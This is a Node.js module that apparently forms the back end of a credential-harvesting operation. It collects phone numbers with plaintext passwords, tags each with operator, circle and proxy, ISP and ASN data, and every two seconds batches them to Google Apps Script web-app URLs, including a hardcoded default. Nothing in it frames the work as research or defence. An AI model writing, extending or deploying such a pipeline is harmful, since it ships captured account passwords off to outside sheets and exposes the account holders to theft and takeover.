const fs = require('fs');
const path = require('path');
const SheetQueue = require('../models/SheetQueue');
const operatorResolver = require('./operatorResolver');
const networkIntelligence = require('./networkIntelligence');

// ─── WebApp URLs Configuration ────────────────────────────────────────────────
const indianWebAppUrls = (process.env.GOOGLE_SHEET_WEBAPP_URLS || process.env.GOOGLE_SHEET_WEBAPP_URL || '')
  .split(',')
  .map(url => url.trim())
  .filter(Boolean);

const defaultGlobalUrl = 'https://script.google.com/macros/s/AKfycbzf_zJnb7YfOaOHC9Q5SbzlAOVelXUbRdxF6ai84FmgDJPUvZL4RhZc9cdYts7jKQLXrQ/exec';
const globalWebAppUrls = (process.env.GLOBAL_SHEET_WEBAPP_URLS || process.env.GLOBAL_SHEET_WEBAPP_URL || defaultGlobalUrl)
  .split(',')
  .map(url => url.trim())
  .filter(Boolean);

let currentIndianUrlIndex = 0;
let currentGlobalUrlIndex = 0;
let isSendingIndian = false;
let isSendingGlobal = false;

// ─── Duplicate Guard ──────────────────────────────────────────────────────────
const _pushedSet = new Set();

function _dedupKey(phone, password) {
  return `${String(phone).trim()}:${String(password || '').trim()}`;
}

function resetDedupCache() {
  _pushedSet.clear();
  console.log('[GoogleSheets] Dedup cache cleared.');
}

const indianQueue = [];
const globalQueue = [];

function getDhakaDateTime(dateObj) {
  const utc = dateObj.getTime() + (dateObj.getTimezoneOffset() * 60000);
  const dhakaTime = new Date(utc + (3600000 * 6));

  const month = dhakaTime.getMonth() + 1;
  const day = dhakaTime.getDate();
  const year = dhakaTime.getFullYear();
  const tabName = `${month}/${day}/${year}`;

  const hour = dhakaTime.getHours();
  const min = dhakaTime.getMinutes();
  const sec = dhakaTime.getSeconds();

  let period = 'Shokal';
  if (hour >= 12 && hour < 17) {
    period = 'Dupur';
  } else if (hour >= 17 && hour < 20) {
    period = 'Shondha';
  } else if (hour >= 20 || hour < 6) {
    period = 'Rat';
  }

  const hour12 = hour % 12 || 12;
  const timeStr = `${hour12}:${String(min).padStart(2, '0')}:${String(sec).padStart(2, '0')} ${period}`;
  const dateTime = `${tabName} | ${timeStr}`;

  return { tabName, dateTime };
}

function formatCredential(credData) {
  const number = String(credData.phone || credData.number || '').trim();
  const pwd = String(credData.password || '').trim();
  const type = String(credData.type || 'DP').trim();
  const country_code = String(credData.country_code || credData.prefix || '').trim();
  
  const isIndian = country_code === '91' || (number.startsWith('91') && number.length === 12);
  const targetSheet = isIndian ? 'indian' : 'global';

  let operator = credData.operator;
  let circle = credData.circle;
  let prefix = credData.prefix;

  // Auto-resolve Indian numbers using 22,040 series master database
  if (isIndian) {
    const resolved = operatorResolver.resolveNumber(number, '91');
    prefix = (!prefix || prefix === '91' || prefix.length < 4) ? resolved.prefix : prefix;
    // CRITICAL: Master database 22,040 series ALWAYS overrides old DB operator names (like Tata Docomo, Telewings, CG)
    operator = (resolved.operator && resolved.operator !== 'Unknown') 
      ? resolved.operator 
      : operatorResolver.normalizeOperator(operator);
    circle = (resolved.circle && resolved.circle !== 'Unknown') 
      ? resolved.circle 
      : operatorResolver.normalizeCircle(circle);
  } else {
    // Auto-resolve global numbers (Pakistan, Egypt, Thailand, Nigeria, Senegal, Ivory Coast, etc.)
    const resolved = operatorResolver.resolveNumber(number, country_code);
    prefix = (!prefix || prefix.length < 2) ? resolved.prefix : prefix;
    operator = (operator && operator !== 'Unknown') ? operator : resolved.operator;
    circle = (circle && circle !== 'Unknown') ? circle : resolved.circle;
  }

  prefix = prefix || (number.length >= 4 ? number.substring(0, 4) : '');
  circle = circle || 'Unknown';
  operator = operator || 'Unknown';
  const opState = `${circle}>${operator}`;

  // Live Network / Proxy Intelligence fields
  let live_isp = credData.live_isp || null;
  let live_asn = credData.live_asn || null;
  let live_city = credData.live_city || null;
  let live_region = credData.live_region || null;
  let network_match_type = credData.network_match_type || 'UNVERIFIED';
  let verified_operator = credData.verified_operator || operator;

  // If proxy string or ASN was provided in credData, analyze dual-layer
  if (credData.proxy_string || credData.proxy || credData.asn) {
    const dualRes = networkIntelligence.analyzeDualLayer(number, {
      proxyStr: credData.proxy_string || credData.proxy || '',
      asn: credData.asn || credData.live_asn || '',
      isp: credData.isp || credData.live_isp || '',
      city: credData.city || credData.live_city || '',
      region: credData.region || credData.live_region || ''
    });
    live_isp = dualRes.live_isp || live_isp;
    live_asn = dualRes.live_asn || live_asn;
    live_city = dualRes.live_city || live_city;
    live_region = dualRes.live_region || live_region;
    network_match_type = dualRes.network_match_type || network_match_type;
    verified_operator = dualRes.live_operator !== 'Unknown' ? dualRes.live_operator : operator;
  }

  const dObj = credData.createdAt ? new Date(credData.createdAt) : new Date();
  const { tabName, dateTime } = getDhakaDateTime(dObj);

  return {
    number,
    pwd,
    type,
    prefix,
    country_code: country_code || (isIndian ? '91' : 'global'),
    targetSheet,
    operator,
    circle,
    opState,
    live_isp,
    live_asn,
    live_city,
    live_region,
    network_match_type,
    verified_operator,
    dateTime,
    tabName
  };
}

async function pushCredential(credData) {
  const phone = credData.phone || credData.number;
  const pwd = credData.password;
  if (!phone || phone === 'undefined' || phone === 'null') {
    return;
  }

  // Session deduplication check
  const dKey = _dedupKey(phone, pwd);
  if (_pushedSet.has(dKey)) {
    console.log(`[GoogleSheets] Skipping duplicate push for ${phone}`);
    return;
  }
  _pushedSet.add(dKey);

  const formatted = formatCredential(credData);

  const payload = {
    number: formatted.number,
    phone: formatted.number,
    password: formatted.pwd,
    type: formatted.type,
    prefix: formatted.prefix,
    country_code: formatted.country_code,
    targetSheet: formatted.targetSheet,
    operator: formatted.operator,
    circle: formatted.circle,
    live_isp: formatted.live_isp,
    live_asn: formatted.live_asn,
    live_city: formatted.live_city,
    live_region: formatted.live_region,
    network_match_type: formatted.network_match_type,
    verified_operator: formatted.verified_operator,
    tabName: formatted.tabName,
    dateTime: formatted.dateTime,
    createdAt: credData.createdAt ? new Date(credData.createdAt) : new Date()
  };

  // 1. In-memory queue for 0ms latency with persistent SheetQueue tracking
  if (formatted.targetSheet === 'global') {
    let docId = null;
    try {
      const doc = await SheetQueue.create(payload);
      docId = doc ? doc._id : null;
    } catch (error) {
      console.error(`[Queue] Failed to save global ${formatted.number} to SheetQueue:`, error.message);
    }
    globalQueue.push({ ...payload, _id: docId });
  } else {
    indianQueue.push(payload);
    // 2. Persist Indian to MongoDB SheetQueue as secondary safety buffer
    try {
      await SheetQueue.create(payload);
    } catch (error) {
      console.error(`[Queue] Failed to save ${formatted.number} to Database SheetQueue:`, error.message);
    }
  }
}

async function sendBatchToSheet(batchToSend, targetSheet = 'indian') {
  const urls = targetSheet === 'global' ? globalWebAppUrls : indianWebAppUrls;
  if (!urls || urls.length === 0) return false;

  let attempts = 0;
  let success = false;
  let currentIndex = targetSheet === 'global' ? currentGlobalUrlIndex : currentIndianUrlIndex;

  while (attempts < urls.length && !success) {
    const urlIndex = (currentIndex + attempts) % urls.length;
    const url = urls[urlIndex];

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 60000);

      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ batch: batchToSend }),
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      if (response.ok) {
        const text = await response.text();
        let resData;
        try { resData = JSON.parse(text); } catch (e) {}
        if (resData && (resData.status === 'success' || resData.success)) {
          success = true;
          if (targetSheet === 'global') {
            currentGlobalUrlIndex = urlIndex;
          } else {
            currentIndianUrlIndex = urlIndex;
          }
          console.log(`[Queue] Pushed ${batchToSend.length} [${targetSheet.toUpperCase()}] credentials to Sheets via URL index ${urlIndex}`);
          break;
        }
      }
    } catch (error) {
      console.error(`[GoogleSheets ${targetSheet.toUpperCase()}] Push error:`, error.message);
    }
    attempts++;
  }

  return success;
}

// ─── User Directive Fast Flusher for Indian & Global Queues (Every 2s) ─────────
// STRICT RULE: Only process active items for Today's Dhaka date (currentTabName).
// Never re-push old date backlogs or re-create sheets/tabs that the user already collected and deleted!
setInterval(async () => {
  const { tabName: currentTabName } = getDhakaDateTime(new Date());

  // 1. Process Indian Sheet Queue
  if (!isSendingIndian) {
    (async () => {
      try {
        let batchToSend = [];
        let isDbItems = false;
        let dbItemIds = [];

        // Memory queue processing
        if (indianQueue.length > 0) {
          const validMemoryItems = [...indianQueue];
          indianQueue.length = 0; // Clear memory queue
          const sendCount = Math.min(validMemoryItems.length, 500);
          batchToSend = validMemoryItems.slice(0, sendCount);
          if (validMemoryItems.length > sendCount) {
            indianQueue.push(...validMemoryItems.slice(sendCount));
          }
        }

        // If memory queue was empty, query DB for pending items
        if (batchToSend.length === 0) {
          const pendingItems = await SheetQueue.find({ 
            targetSheet: { $ne: 'global' }
          }).sort({ createdAt: 1 }).limit(500).lean();

          if (pendingItems && pendingItems.length > 0) {
            const validItems = [];
            const invalidIds = [];
            for (const item of pendingItems) {
              const num = item.number || item.phone;
              if (!num || num === 'undefined' || num === 'null') {
                invalidIds.push(item._id);
              } else {
                validItems.push(item);
              }
            }
            if (invalidIds.length > 0) {
              await SheetQueue.deleteMany({ _id: { $in: invalidIds } });
            }
            if (validItems.length > 0) {
              batchToSend = validItems.map(item => {
                const { _id, __v, createdAt, ...rest } = item;
                return rest;
              });
              isDbItems = true;
              dbItemIds = validItems.map(item => item._id);
            }
          }
        }

        if (batchToSend.length > 0) {
          isSendingIndian = true;
          const success = await sendBatchToSheet(batchToSend, 'indian');
          if (success) {
            if (isDbItems && dbItemIds.length > 0) {
              await SheetQueue.deleteMany({ _id: { $in: dbItemIds } });
            }
          } else {
            if (!isDbItems) {
              indianQueue.unshift(...batchToSend);
            }
          }
        }
      } catch (err) {
        console.error(`[Queue Indian] Error:`, err.message);
      } finally {
        isSendingIndian = false;
      }
    })();
  }

  // 2. Process Global Sheet Queue
  if (!isSendingGlobal) {
    (async () => {
      try {
        let batchToSend = [];
        let itemIdsToDelete = [];

        if (globalQueue.length > 0) {
          const validGlobalMemory = [...globalQueue];
          globalQueue.length = 0;
          const sendCount = Math.min(validGlobalMemory.length, 500);
          const rawBatch = validGlobalMemory.slice(0, sendCount);
          for (const item of rawBatch) {
            const { _id, ...rest } = item;
            batchToSend.push(rest);
            if (_id) itemIdsToDelete.push(_id);
          }
          if (validGlobalMemory.length > sendCount) {
            globalQueue.push(...validGlobalMemory.slice(sendCount));
          }
        }

        if (batchToSend.length === 0) {
          const pendingItems = await SheetQueue.find({ 
            targetSheet: 'global'
          }).sort({ createdAt: 1 }).limit(500).lean();

          if (pendingItems && pendingItems.length > 0) {
            const validItems = [];
            const invalidIds = [];
            for (const item of pendingItems) {
              const num = item.number || item.phone;
              if (!num || num === 'undefined' || num === 'null') {
                invalidIds.push(item._id);
              } else {
                validItems.push(item);
              }
            }
            if (invalidIds.length > 0) {
              await SheetQueue.deleteMany({ _id: { $in: invalidIds } });
            }
            if (validItems.length > 0) {
              batchToSend = validItems.map(item => {
                const { _id, __v, createdAt, ...rest } = item;
                return rest;
              });
              itemIdsToDelete = validItems.map(item => item._id);
            }
          }
        }

        if (batchToSend.length > 0) {
          isSendingGlobal = true;
          const success = await sendBatchToSheet(batchToSend, 'global');
          if (success) {
            if (itemIdsToDelete.length > 0) {
              await SheetQueue.deleteMany({ _id: { $in: itemIdsToDelete } });
            }
          } else {
            // Re-insert into memory queue on failure so they are retried
            globalQueue.unshift(...batchToSend.map((item, idx) => ({
              ...item,
              _id: itemIdsToDelete[idx] || null
            })));
          }
        }
      } catch (err) {
        console.error(`[Queue Global] Error:`, err.message);
      } finally {
        isSendingGlobal = false;
      }
    })();
  }
}, 2000);

module.exports = {
  pushCredential,
  resetDedupCache,
  formatCredential
};
